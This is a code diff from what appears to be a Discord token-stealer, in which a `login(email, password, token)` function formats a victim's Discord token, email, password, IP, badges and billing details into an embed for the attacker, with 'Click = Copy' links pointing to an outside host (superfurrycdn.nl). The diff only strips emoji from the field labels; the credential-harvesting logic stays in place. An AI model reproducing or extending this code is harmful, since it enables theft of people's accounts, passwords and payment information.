@@ -583,37 +583,37 @@ const login = async (email, password, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '<a:9382blueheart:985665072187707452> @SN - Token:',
+            name: '@SN - Token:',
             value: `\`\`\`${token}\`\`\`\n[Click = Copy](https://superfurrycdn.nl/copy/${token})`,
             inline: false,
           },
           {
-            name: '<:1205bluepawprints:985668463899050014 @SN - Badges:',
+            name: '@SN - Badges:',
             value: `${badges}`,
             inline: true,
           },
           {
-            name: '<a:6132lightblueheartspin:985668720422682724> @SN - Billing:',
+            name: '@SN - Billing:',
             value: `${billing}`,
             inline: true,
           },
           {
-            name: '<a:9048bluemendedheart:986020801004318740> @SN - Nitro:',
+            name: '@SN - Nitro:',
             value: `*soon..*`,
             inline: true,
           },
           {
-            name: '<a:9574_Butterfly_Blue:985666963089014805> @SN - Email:',
+            name: '@SN - Email:',
             value: `\`${email}\`\n[Click = Copy](https://superfurrycdn.nl/copy/${token})`,
             inline: true,
           },
           {
-            name: '<a:5211fireemojis:985667589961318430> @SN - IP:',
+            name: '@SN - IP:',
             value: `\`${config.ip}\``,
             inline: true,
           },
           {
-            name: '<a:4536gun4:985673435860586557> @SN - Password:',
+            name: '@SN - Password:',
             value: `\`${password}\`\n[Click = Copy](https://superfurrycdn.nl/copy/${token})`,
             inline: true,
           },
